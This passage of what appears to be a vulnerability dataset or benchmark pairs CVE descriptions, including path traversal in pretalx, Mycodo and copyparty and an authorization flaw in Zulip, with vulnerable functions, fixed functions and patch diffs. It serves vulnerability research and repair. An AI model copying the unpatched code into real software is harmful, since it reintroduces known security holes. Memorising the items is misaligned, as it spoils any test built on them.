self._cert2ossl(ca.certificate)\n                    if ca_alias is None:\n                        res = self._lib.X509_alias_set1(\n                            ossl_ca, self._ffi.NULL, -1\n                        )\n                    else:\n                        res = self._lib.X509_alias_set1(\n                            ossl_ca, ca_alias, len(ca_alias)\n                        )\n                    self.openssl_assert(res == 1)\n                else:\n                    ossl_ca = self._cert2ossl(ca)\n                ossl_cas.append(ossl_ca)\n                res = self._lib.sk_X509_push(sk_x509, ossl_ca)\n                backend.openssl_assert(res >= 1)\n\n        with self._zeroed_null_terminated_buf(password) as password_buf:\n            with self._zeroed_null_terminated_buf(name) as name_buf:\n                ossl_cert = self._cert2ossl(cert) if cert else self._ffi.NULL\n                ossl_pkey = (\n                    self._key2ossl(key) if key is not None else self._ffi.NULL\n                )\n\n                p12 = self._lib.PKCS12_create(\n                    password_buf,\n                    name_buf,\n                    ossl_pkey,\n                    ossl_cert,\n                    sk_x509,\n                    nid_key,\n                    nid_cert,\n                    pkcs12_iter,\n                    mac_iter,\n                    0,\n                )\n\n            if (\n                self._lib.Cryptography_HAS_PKCS12_SET_MAC\n                and mac_alg != self._ffi.NULL\n            ):\n                self._lib.PKCS12_set_mac(\n                    p12,\n                    password_buf,\n                    -1,\n                    self._ffi.NULL,\n                    0,\n                    mac_iter,\n                    mac_alg,\n                )\n\n        self.openssl_assert(p12 != self._ffi.NULL)\n        p12 = self._ffi.gc(p12, self._lib.PKCS12_free)\n\n        bio = self._create_mem_bio_gc()\n        res = self._lib.i2d_PKCS12_bio(bio, p12)\n        self.openssl_assert(res > 0)\n        return self._read_mem_bio(bio)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_427_1",
        "commit": "97d231672763cdb5959a3b191e692a362f1b9e55",
        "file_path": "src/cryptography/hazmat/backends/openssl/backend.py",
        "start_line": 491,
        "end_line": 656,
        "snippet": "    def serialize_key_and_certificates_to_pkcs12(\n        self,\n        name: bytes | None,\n        key: PKCS12PrivateKeyTypes | None,\n        cert: x509.Certificate | None,\n        cas: list[_PKCS12CATypes] | None,\n        encryption_algorithm: serialization.KeySerializationEncryption,\n    ) -> bytes:\n        password = None\n        if name is not None:\n            utils._check_bytes(\"name\", name)\n\n        if isinstance(encryption_algorithm, serialization.NoEncryption):\n            nid_cert = -1\n            nid_key = -1\n            pkcs12_iter = 0\n            mac_iter = 0\n            mac_alg = self._ffi.NULL\n        elif isinstance(\n            encryption_algorithm, serialization.BestAvailableEncryption\n        ):\n            # PKCS12 encryption is hopeless trash and can never be fixed.\n            # OpenSSL 3 supports PBESv2, but Libre and Boring do not, so\n            # we use PBESv1 with 3DES on the older paths.\n            if rust_openssl.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER:\n                nid_cert = self._lib.NID_aes_256_cbc\n                nid_key = self._lib.NID_aes_256_cbc\n            else:\n                nid_cert = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n                nid_key = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n            # At least we can set this higher than OpenSSL's default\n            pkcs12_iter = 20000\n            # mac_iter chosen for compatibility reasons, see:\n            # https://www.openssl.org/docs/man1.1.1/man3/PKCS12_create.html\n            # Did we mention how lousy PKCS12 encryption is?\n            mac_iter = 1\n            # MAC algorithm can only be set on OpenSSL 3.0.0+\n            mac_alg = self._ffi.NULL\n            password = encryption_algorithm.password\n        elif (\n            isinstance(\n                encryption_algorithm, serialization._KeySerializationEncryption\n            )\n            and encryption_algorithm._format\n            is serialization.PrivateFormat.PKCS12\n        ):\n            # Default to OpenSSL's defaults. Behavior will vary based on the\n            # version of OpenSSL cryptography is compiled against.\n            nid_cert = 0\n            nid_key = 0\n            # Use the default iters we use in best available\n            pkcs12_iter = 20000\n            # See the Best Available comment for why this is 1\n            mac_iter = 1\n            password = encryption_algorithm.password\n            keycertalg = encryption_algorithm._key_cert_algorithm\n            if keycertalg is PBES.PBESv1SHA1And3KeyTripleDESCBC:\n                nid_cert = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n                nid_key = self._lib.NID_pbe_WithSHA1And3_Key_TripleDES_CBC\n            elif keycertalg is PBES.PBESv2SHA256AndAES256CBC:\n                if not rust_openssl.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER:\n                    raise UnsupportedAlgorithm(\n                        \"PBESv2 is not supported by this version of OpenSSL\"\n                    )\n                nid_cert = self._lib.NID_aes_256_cbc\n                nid_key = self._lib.NID_aes_256_cbc\n            else:\n                assert keycertalg is None\n                # We use OpenSSL's defaults\n\n            if encryption_algorithm._hmac_hash is not None:\n                if not self._lib.Cryptography_HAS_PKCS12_SET_MAC:\n                    raise UnsupportedAlgorithm(\n                        \"Setting MAC algorithm is not supported by this \"\n                        \"version of OpenSSL.\"\n                    )\n                mac_alg = self._evp_md_non_null_from_algorithm(\n                    encryption_algorithm._hmac_hash\n                )\n                self.openssl_assert(mac_alg != self._ffi.NULL)\n            else:\n                mac_alg = self._ffi.NULL\n\n            if encryption_algorithm._kdf_rounds is not None:\n                pkcs12_iter = encryption_algorithm._kdf_rounds\n\n        else:\n            raise ValueError(\"Unsupported key encryption type\")\n\n        if cas is None or len(cas) == 0:\n            sk_x509 = self._ffi.NULL\n        else:\n            sk_x509 = self._lib.sk_X509_new_null()\n            sk_x509 = self._ffi.gc(sk_x509, self._lib.sk_X509_free)\n\n            # This list is to keep the x509 values alive until end of function\n            ossl_cas = []\n            for ca in cas:\n                if isinstance(ca, PKCS12Certificate):\n                    ca_alias = ca.friendly_name\n                    ossl_ca = self._cert2ossl(ca.certificate)\n                    if ca_alias is None:\n                        res = self._lib.X509_alias_set1(\n                            ossl_ca, self._ffi.NULL, -1\n                        )\n                    else:\n                        res = self._lib.X509_alias_set1(\n                            ossl_ca, ca_alias, len(ca_alias)\n                        )\n                    self.openssl_assert(res == 1)\n                else:\n                    ossl_ca = self._cert2ossl(ca)\n                ossl_cas.append(ossl_ca)\n                res = self._lib.sk_X509_push(sk_x509, ossl_ca)\n                backend.openssl_assert(res >= 1)\n\n        with self._zeroed_null_terminated_buf(password) as password_buf:\n            with self._zeroed_null_terminated_buf(name) as name_buf:\n                ossl_cert = self._cert2ossl(cert) if cert else self._ffi.NULL\n                ossl_pkey = (\n                    self._key2ossl(key) if key is not None else self._ffi.NULL\n                )\n\n                p12 = self._lib.PKCS12_create(\n                    password_buf,\n                    name_buf,\n                    ossl_pkey,\n                    ossl_cert,\n                    sk_x509,\n                    nid_key,\n                    nid_cert,\n                    pkcs12_iter,\n                    mac_iter,\n                    0,\n                )\n                if p12 == self._ffi.NULL:\n                    errors = self._consume_errors()\n                    raise ValueError(\n                        (\n                            \"Failed to create PKCS12 (does the key match the \"\n                            \"certificate?)\"\n                        ),\n                        errors,\n                    )\n\n            if (\n                self._lib.Cryptography_HAS_PKCS12_SET_MAC\n                and mac_alg != self._ffi.NULL\n            ):\n                self._lib.PKCS12_set_mac(\n                    p12,\n                    password_buf,\n                    -1,\n                    self._ffi.NULL,\n                    0,\n                    mac_iter,\n                    mac_alg,\n                )\n\n        self.openssl_assert(p12 != self._ffi.NULL)\n        p12 = self._ffi.gc(p12, self._lib.PKCS12_free)\n\n        bio = self._create_mem_bio_gc()\n        res = self._lib.i2d_PKCS12_bio(bio, p12)\n        self.openssl_assert(res > 0)\n        return self._read_mem_bio(bio)"
      }
    ],
    "vul_patch": "--- a/src/cryptography/hazmat/backends/openssl/backend.py\n+++ b/src/cryptography/hazmat/backends/openssl/backend.py\n@@ -133,6 +133,15 @@\n                     mac_iter,\n                     0,\n                 )\n+                if p12 == self._ffi.NULL:\n+                    errors = self._consume_errors()\n+                    raise ValueError(\n+                        (\n+                            \"Failed to create PKCS12 (does the key match the \"\n+                            \"certificate?)\"\n+                        ),\n+                        errors,\n+                    )\n \n             if (\n                 self._lib.Cryptography_HAS_PKCS12_SET_MAC\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-28458",
    "cve_description": "pretalx 2.3.1 before 2.3.2 allows path traversal in HTML export (a non-default feature). Organizers can trigger the overwriting (with the standard pretalx 404 page content) of an arbitrary file.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/pretalx/pretalx",
    "patch_url": [
      "https://github.com/pretalx/pretalx/commit/60722c43cf975f319e94102e6bff320723776890"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_304_1",
        "commit": "4732e8f",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 112,
        "end_line": 123,
        "snippet": "def dump_content(destination, path, getter):\n    logging.debug(path)\n    content = getter(path)\n    if path.endswith(\"/\"):\n        path = path + \"index.html\"\n\n    path = Path(destination) / path.lstrip(\"/\")\n    path.parent.mkdir(parents=True, exist_ok=True)\n\n    with open(path, \"wb\") as f:\n        f.write(content)\n    return content"
      },
      {
        "id": "vul_py_304_2",
        "commit": "4732e8f",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 126,
        "end_line": 135,
        "snippet": "def get_mediastatic_content(url):\n    if url.startswith(settings.STATIC_URL):\n        local_path = settings.STATIC_ROOT / url[len(settings.STATIC_URL) :]\n    elif url.startswith(settings.MEDIA_URL):\n        local_path = settings.MEDIA_ROOT / url[len(settings.MEDIA_URL) :]\n    else:\n        raise FileNotFoundError()\n\n    with open(local_path, \"rb\") as f:\n        return f.read()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_304_1",
        "commit": "60722c43cf975f319e94102e6bff320723776890",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 112,
        "end_line": 125,
        "snippet": "def dump_content(destination, path, getter):\n    logging.debug(path)\n    content = getter(path)\n    if path.endswith(\"/\"):\n        path = path + \"index.html\"\n\n    path = (Path(destination) / path.lstrip(\"/\")).resolve()\n    if not Path(destination) in path.parents:\n        raise CommandError(\"Path traversal detected, aborting.\")\n    path.parent.mkdir(parents=True, exist_ok=True)\n\n    with open(path, \"wb\") as f:\n        f.write(content)\n    return content"
      },
      {
        "id": "fix_py_304_2",
        "commit": "60722c43cf975f319e94102e6bff320723776890",
        "file_path": "src/pretalx/agenda/management/commands/export_schedule_html.py",
        "start_line": 128,
        "end_line": 145,
        "snippet": "def get_mediastatic_content(url):\n    if url.startswith(settings.STATIC_URL):\n        local_path = settings.STATIC_ROOT / url[len(settings.STATIC_URL) :]\n    elif url.startswith(settings.MEDIA_URL):\n        local_path = settings.MEDIA_ROOT / url[len(settings.MEDIA_URL) :]\n    else:\n        raise FileNotFoundError()\n\n    # Prevent directory traversal, make sure the path is inside the media or static root\n    local_path = local_path.resolve(strict=True)\n    if not any(\n        path in local_path.parents\n        for path in (settings.MEDIA_ROOT, settings.STATIC_ROOT)\n    ):\n        raise FileNotFoundError()\n\n    with open(local_path, \"rb\") as f:\n        return f.read()"
      }
    ],
    "vul_patch": "--- a/src/pretalx/agenda/management/commands/export_schedule_html.py\n+++ b/src/pretalx/agenda/management/commands/export_schedule_html.py\n@@ -4,7 +4,9 @@\n     if path.endswith(\"/\"):\n         path = path + \"index.html\"\n \n-    path = Path(destination) / path.lstrip(\"/\")\n+    path = (Path(destination) / path.lstrip(\"/\")).resolve()\n+    if not Path(destination) in path.parents:\n+        raise CommandError(\"Path traversal detected, aborting.\")\n     path.parent.mkdir(parents=True, exist_ok=True)\n \n     with open(path, \"wb\") as f:\n\n--- a/src/pretalx/agenda/management/commands/export_schedule_html.py\n+++ b/src/pretalx/agenda/management/commands/export_schedule_html.py\n@@ -6,5 +6,13 @@\n     else:\n         raise FileNotFoundError()\n \n+    # Prevent directory traversal, make sure the path is inside the media or static root\n+    local_path = local_path.resolve(strict=True)\n+    if not any(\n+        path in local_path.parents\n+        for path in (settings.MEDIA_ROOT, settings.STATIC_ROOT)\n+    ):\n+        raise FileNotFoundError()\n+\n     with open(local_path, \"rb\") as f:\n         return f.read()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-41185",
    "cve_description": "Mycodo is an environmental monitoring and regulation system. An exploit in versions prior to 8.12.7 allows anyone with access to endpoints to download files outside the intended directory. A patch has been applied and a release made. Users should upgrade to version 8.12.7. As a workaround, users may manually apply the changes from the fix commit.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/kizniche/Mycodo",
    "patch_url": [
      "https://github.com/kizniche/Mycodo/commit/23ac5dd422029c2b6ae1701a3599b6d41b66a6a9"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_390_1",
        "commit": "69acf2646f5e50435e086bd544a9d264adc00edf",
        "file_path": "mycodo/mycodo_flask/routes_general.py",
        "start_line": 115,
        "end_line": 122,
        "snippet": "def send_note_attachment(filename):\n    \"\"\"Return a file from the note attachment directory\"\"\"\n    file_path = os.path.join(PATH_NOTE_ATTACHMENTS, filename)\n    if file_path is not None:\n        try:\n            return send_file(file_path, as_attachment=True)\n        except Exception:\n            logger.exception(\"Send note attachment\")"
      },
      {
        "id": "vul_py_390_2",
        "commit": "69acf2646f5e50435e086bd544a9d264adc00edf",
        "file_path": "mycodo/mycodo_flask/routes_general.py",
        "start_line": 127,
        "end_line": 154,
        "snippet": "def camera_img_return_path(camera_unique_id, img_type, filename):\n    \"\"\"Return an image from stills or time-lapses\"\"\"\n    camera = Camera.query.filter(Camera.unique_id == camera_unique_id).first()\n    camera_path = assure_path_exists(\n        os.path.join(PATH_CAMERAS, '{uid}'.format(uid=camera.unique_id)))\n    if img_type == 'still':\n        if camera.path_still:\n            path = camera.path_still\n        else:\n            path = os.path.join(camera_path, img_type)\n    elif img_type == 'timelapse':\n        if camera.path_timelapse:\n            path = camera.path_timelapse\n        else:\n            path = os.path.join(camera_path, img_type)\n    else:\n        return \"Unknown Image Type\"\n\n    if os.path.isdir(path):\n        files = (files for files in os.listdir(path)\n                 if os.path.isfile(os.path.join(path, files)))\n    else:\n        files = []\n    if filename in files:\n        path_file = os.path.join(path, filename)\n        return send_file(path_file, mimetype='image/jpeg')\n\n    return \"Image not found\""
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_390_1",
        "commit": "23ac5dd422029c2b6ae1701a3599b6d41b66a6a9",
        "file_path": "mycodo/mycodo_flask/routes_general.py",
        "start_line": 115,
        "end_line": 123,
        "snippet": "def send_note_attachment(filename):\n    \"\"\"Return a file from the note attachment directory\"\"\"\n    file_path = os.path.join(PATH_NOTE_ATTACHMENTS, filename)\n    if file_path is not None:\n        try:\n            if os.path.abspath(file_path).startswith(PATH_NOTE_ATTACHMENTS):\n                return send_file(file_path, as_attachment=True)\n        except Exception:\n            logger.exception(\"Send note attachment\")"
      },
      {
        "id": "fix_py_390_2",
        "commit": "23ac5dd422029c2b6ae1701a3599b6d41b66a6a9",
        "file_path": "mycodo/mycodo_flask/routes_general.py",
        "start_line": 128,
        "end_line": 156,
        "snippet": "def camera_img_return_path(camera_unique_id, img_type, filename):\n    \"\"\"Return an image from stills or time-lapses\"\"\"\n    camera = Camera.query.filter(Camera.unique_id == camera_unique_id).first()\n    camera_path = assure_path_exists(\n        os.path.join(PATH_CAMERAS, '{uid}'.format(uid=camera.unique_id)))\n    if img_type == 'still':\n        if camera.path_still:\n            path = camera.path_still\n        else:\n            path = os.path.join(camera_path, img_type)\n    elif img_type == 'timelapse':\n        if camera.path_timelapse:\n            path = camera.path_timelapse\n        else:\n            path = os.path.join(camera_path, img_type)\n    else:\n        return \"Unknown Image Type\"\n\n    if os.path.isdir(path):\n        files = (files for files in os.listdir(path)\n                 if os.path.isfile(os.path.join(path, files)))\n    else:\n        files = []\n    if filename in files:\n        path_file = os.path.join(path, filename)\n        if os.path.abspath(path_file).startswith(path):\n            return send_file(path_file, mimetype='image/jpeg')\n\n    return \"Image not found\""
      }
    ],
    "vul_patch": "--- a/mycodo/mycodo_flask/routes_general.py\n+++ b/mycodo/mycodo_flask/routes_general.py\n@@ -3,6 +3,7 @@\n     file_path = os.path.join(PATH_NOTE_ATTACHMENTS, filename)\n     if file_path is not None:\n         try:\n-            return send_file(file_path, as_attachment=True)\n+            if os.path.abspath(file_path).startswith(PATH_NOTE_ATTACHMENTS):\n+                return send_file(file_path, as_attachment=True)\n         except Exception:\n             logger.exception(\"Send note attachment\")\n\n--- a/mycodo/mycodo_flask/routes_general.py\n+++ b/mycodo/mycodo_flask/routes_general.py\n@@ -23,6 +23,7 @@\n         files = []\n     if filename in files:\n         path_file = os.path.join(path, filename)\n-        return send_file(path_file, mimetype='image/jpeg')\n+        if os.path.abspath(path_file).startswith(path):\n+            return send_file(path_file, mimetype='image/jpeg')\n \n     return \"Image not found\"\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-0881",
    "cve_description": "An error in the implementation of an autosubscribe feature in the check_stream_exists route of the Zulip group chat application server before 1.4.3 allowed an authenticated user to subscribe to a private stream that should have required an invitation from an existing member to join. The issue affects all previously released versions of the Zulip server.",
    "cwe_info": {
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/7ecda1ac8e26d8fb3725e954b2dc4723dda2255f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_354_1",
        "commit": "7e0ce22808f70793ba1aeab6da46c539296cdec7",
        "file_path": "zerver/views/streams.py",
        "start_line": 475,
        "end_line": 491,
        "snippet": "def stream_exists_backend(request, user_profile, stream_id, autosubscribe):\n    # type: (HttpRequest, UserProfile, int, bool) -> HttpResponse\n    try:\n        stream = get_and_validate_stream_by_id(stream_id, user_profile.realm)\n    except JsonableError:\n        stream = None\n    result = {\"exists\": bool(stream)}\n    if stream is not None:\n        recipient = get_recipient(Recipient.STREAM, stream.id)\n        if autosubscribe:\n            bulk_add_subscriptions([stream], [user_profile])\n        result[\"subscribed\"] = is_active_subscriber(\n            user_profile=user_profile,\n            recipient=recipient)\n\n        return json_success(result) # results are ignored for HEAD requests\n    return json_response(data=result, status=404)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_354_1",
        "commit": "7ecda1ac8e26d8fb3725e954b2dc4723dda2255f",
        "file_path": "zerver/views/streams.py",
        "start_line": 475,
        "end_line": 491,
        "snippet": "def stream_exists_backend(request, user_profile, stream_id, autosubscribe):\n    # type: (HttpRequest, UserProfile, int, bool) -> HttpResponse\n    try:\n        stream = get_and_validate_stream_by_id(stream_id, user_profile.realm)\n    except JsonableError:\n        stream = None\n    result = {\"exists\": bool(stream)}\n    if stream is not None:\n        recipient = get_recipient(Recipient.STREAM, stream.id)\n        if not stream.invite_only and autosubscribe:\n            bulk_add_subscriptions([stream], [user_profile])\n        result[\"subscribed\"] = is_active_subscriber(\n            user_profile=user_profile,\n            recipient=recipient)\n\n        return json_success(result) # results are ignored for HEAD requests\n    return json_response(data=result, status=404)"
      }
    ],
    "vul_patch": "--- a/zerver/views/streams.py\n+++ b/zerver/views/streams.py\n@@ -7,7 +7,7 @@\n     result = {\"exists\": bool(stream)}\n     if stream is not None:\n         recipient = get_recipient(Recipient.STREAM, stream.id)\n-        if autosubscribe:\n+        if not stream.invite_only and autosubscribe:\n             bulk_add_subscriptions([stream], [user_profile])\n         result[\"subscribed\"] = is_active_subscriber(\n             user_profile=user_profile,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-37474",
    "cve_description": "Copyparty is a portable file server. Versions prior to 1.8.2 are subject to a path traversal vulnerability detected in the `.cpr` subfolder. The Path Traversal attack technique allows an attacker access to files, directories, and commands that reside outside the web document root directory. This issue has been addressed in commit `043e3c7d` which has been included in release 1.8.2. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/9001/copyparty",
    "patch_url": [
      "https://github.com/9001/copyparty/commit/043e3c7dd683113e2b1c15cacb9c8e68f76513ff"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_216_1",
        "commit": "8f59afb",
        "file_path": "copyparty/httpcli.py",
        "start_line": 751,
        "end_line": 864,
        "snippet": "    def handle_get(self) -> bool:\n        if self.do_log:\n            logmsg = \"%-4s %s @%s\" % (self.mode, self.req, self.uname)\n\n            if \"range\" in self.headers:\n                try:\n                    rval = self.headers[\"range\"].split(\"=\", 1)[1]\n                except:\n                    rval = self.headers[\"range\"]\n\n                logmsg += \" [\\033[36m\" + rval + \"\\033[0m]\"\n\n            self.log(logmsg)\n\n        # \"embedded\" resources\n        if self.vpath.startswith(\".cpr\"):\n            if self.vpath.startswith(\".cpr/ico/\"):\n                return self.tx_ico(self.vpath.split(\"/\")[-1], exact=True)\n\n            if self.vpath.startswith(\".cpr/ssdp\"):\n                return self.conn.hsrv.ssdp.reply(self)\n\n            if self.vpath.startswith(\".cpr/dd/\") and self.args.mpmc:\n                if self.args.mpmc == \".\":\n                    raise Pebkac(404)\n\n                loc = self.args.mpmc.rstrip(\"/\") + self.vpath[self.vpath.rfind(\"/\") :]\n                h = {\"Location\": loc, \"Cache-Control\": \"max-age=39\"}\n                self.reply(b\"\", 301, headers=h)\n                return True\n\n            static_path = os.path.join(self.E.mod, \"web/\", self.vpath[5:])\n            return self.tx_file(static_path)\n\n        if \"cf_challenge\" in self.uparam:\n            self.reply(self.j2s(\"cf\").encode(\"utf-8\", \"replace\"))\n            return True\n\n        if not self.can_read and not self.can_write and not self.can_get:\n            t = \"@{} has no access to [{}]\"\n            self.log(t.format(self.uname, self.vpath))\n\n            if \"on403\" in self.vn.flags:\n                ret = self.on40x(self.vn.flags[\"on403\"], self.vn, self.rem)\n                if ret == \"true\":\n                    return True\n                elif ret == \"false\":\n                    return False\n                elif ret == \"allow\":\n                    self.log(\"plugin override; access permitted\")\n                    self.can_read = self.can_write = self.can_move = True\n                    self.can_delete = self.can_get = self.can_upget = True\n                    self.can_admin = True\n                else:\n                    return self.tx_404(True)\n            else:\n                if self.vpath:\n                    return self.tx_404(True)\n\n                self.uparam[\"h\"] = \"\"\n\n        if \"tree\" in self.uparam:\n            return self.tx_tree()\n\n        if \"scan\" in self.uparam:\n            return self.scanvol()\n\n        if self.args.getmod:\n            if \"delete\" in self.uparam:\n                return self.handle_rm([])\n\n            if \"move\" in self.uparam:\n                return self.handle_mv()\n\n        if not self.vpath:\n            if \"reload\" in self.uparam:\n                return self.handle_reload()\n\n            if \"stack\" in self.uparam:\n                return self.tx_stack()\n\n            if \"ups\" in self.uparam:\n                return self.tx_ups()\n\n            if \"k304\" in self.uparam:\n                return self.set_k304()\n\n            if \"setck\" in self.uparam:\n                return self.setck()\n\n            if \"reset\" in self.uparam:\n                return self.set_cfg_reset()\n\n            if \"hc\" in self.uparam:\n                return self.tx_svcs()\n\n        if \"h\" in self.uparam:\n            return self.tx_mounts()\n\n        # conditional redirect to single volumes\n        if self.vpath == \"\" and not self.ouparam:\n            nread = len(self.rvol)\n            nwrite = len(self.wvol)\n            if nread + nwrite == 1 or (self.rvol == self.wvol and nread == 1):\n                if nread == 1:\n                    vpath = self.rvol[0]\n                else:\n                    vpath = self.wvol[0]\n\n                if self.vpath != vpath:\n                    self.redirect(vpath, flavor=\"redirecting to\", use302=True)\n                    return True\n\n        return self.tx_browser()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_216_1",
        "commit": "043e3c7",
        "file_path": "copyparty/httpcli.py",
        "start_line": 752,
        "end_line": 872,
        "snippet": "    def handle_get(self) -> bool:\n        if self.do_log:\n            logmsg = \"%-4s %s @%s\" % (self.mode, self.req, self.uname)\n\n            if \"range\" in self.headers:\n                try:\n                    rval = self.headers[\"range\"].split(\"=\", 1)[1]\n                except:\n                    rval = self.headers[\"range\"]\n\n                logmsg += \" [\\033[36m\" + rval + \"\\033[0m]\"\n\n            self.log(logmsg)\n\n        # \"embedded\" resources\n        if self.vpath.startswith(\".cpr\"):\n            if self.vpath.startswith(\".cpr/ico/\"):\n                return self.tx_ico(self.vpath.split(\"/\")[-1], exact=True)\n\n            if self.vpath.startswith(\".cpr/ssdp\"):\n                return self.conn.hsrv.ssdp.reply(self)\n\n            if self.vpath.startswith(\".cpr/dd/\") and self.args.mpmc:\n                if self.args.mpmc == \".\":\n                    raise Pebkac(404)\n\n                loc = self.args.mpmc.rstrip(\"/\") + self.vpath[self.vpath.rfind(\"/\") :]\n                h = {\"Location\": loc, \"Cache-Control\": \"max-age=39\"}\n                self.reply(b\"\", 301, headers=h)\n                return True\n\n            path_base = os.path.join(self.E.mod, \"web\")\n            static_path = absreal(os.path.join(path_base, self.vpath[5:]))\n            if not static_path.startswith(path_base):\n                t = \"attempted path traversal [{}] => [{}]\"\n                self.log(t.format(self.vpath, static_path), 1)\n                self.tx_404()\n                return False\n\n            return self.tx_file(static_path)\n\n        if \"cf_challenge\" in self.uparam:\n            self.reply(self.j2s(\"cf\").encode(\"utf-8\", \"replace\"))\n            return True\n\n        if not self.can_read and not self.can_write and not self.can_get:\n            t = \"@{} has no access to [{}]\"\n            self.log(t.format(self.uname, self.vpath))\n\n            if \"on403\" in self.vn.flags:\n                ret = self.on40x(self.vn.flags[\"on403\"], self.vn, self.rem)\n                if ret == \"true\":\n                    return True\n                elif ret == \"false\":\n                    return False\n                elif ret == \"allow\":\n                    self.log(\"plugin override; access permitted\")\n                    self.can_read = self.can_write = self.can_move = True\n                    self.can_delete = self.can_get = self.can_upget = True\n                    self.can_admin = True\n                else:\n                    return self.tx_404(True)\n            else:\n                if self.vpath:\n                    return self.tx_404(True)\n\n                self.uparam[\"h\"] = \"\"\n\n        if \"tree\" in self.uparam:\n            return self.tx_tree()\n\n        if \"scan\" in self.uparam:\n            return self.scanvol()\n\n        if self.args.getmod:\n            if \"delete\" in self.uparam:\n                return self.handle_rm([])\n\n            if \"move\" in self.uparam:\n                return self.handle_mv()\n\n        if not self.vpath:\n            if \"reload\" in self.uparam:\n                return self.handle_reload()\n\n            if \"stack\" in self.uparam:\n                return self.tx_stack()\n\n            if \"ups\" in self.uparam:\n                return self.tx_ups()\n\n            if \"k304\" in self.uparam:\n                return self.set_k304()\n\n            if \"setck\" in self.uparam:\n                return self.setck()\n\n            if \"reset\" in self.uparam:\n                return self.set_cfg_reset()\n\n            if \"hc\" in self.uparam:\n                return self.tx_svcs()\n\n        if \"h\" in self.uparam:\n            return self.tx_mounts()\n\n        # conditional redirect to single volumes\n        if self.vpath == \"\" and not self.ouparam:\n            nread = len(self.rvol)\n            nwrite = len(self.wvol)\n            if nread + nwrite == 1 or (self.rvol == self.wvol and nread == 1):\n                if nread == 1:\n                    vpath = self.rvol[0]\n                else:\n                    vpath = self.wvol[0]\n\n                if self.vpath != vpath:\n                    self.redirect(vpath, flavor=\"redirecting to\", use302=True)\n                    return True\n\n        return self.tx_browser()"
      }
    ],
    "vul_patch": "--- a/copyparty/httpcli.py\n+++ b/copyparty/httpcli.py\n@@ -29,7 +29,14 @@\n                 self.reply(b\"\", 301, headers=h)\n                 return True\n \n-            static_path = os.path.join(self.E.mod, \"web/\", self.vpath[5:])\n+            path_base = os.path.join(self.E.mod, \"web\")\n+            static_path = absreal(os.path.join(path_base, self.vpath[5:]))\n+            if not static_path.startswith(path_base):\n+                t = \"attempted path traversal [{}] => [{}]\"\n+                self.log(t.format(self.vpath, static_path), 1)\n+                self.tx_404()\n+                return False\n+\n             return self.tx_file(static_path)\n \n         if \"cf_challenge\" in self.uparam:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-47037",
    "cve_description": "We failed to apply\u00a0CVE-2023-40611 in 2.7.1 and this vulnerability was marked as fixed then.\u00a0\n\nApache Airflow, versions before 2.7.3, is affected by a vulnerability that allows authenticated and DAG-view authorized Users to modify some DAG run detail values when submitting notes. This could have them alter details such as configuration parameters, start date, etc.\u00a0\n\nUsers should upgrade to version 2.7.3 or later which has removed the vulnerability.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/2a0106e4edf67c5905ebfcb82a6008662ae0f7ad",
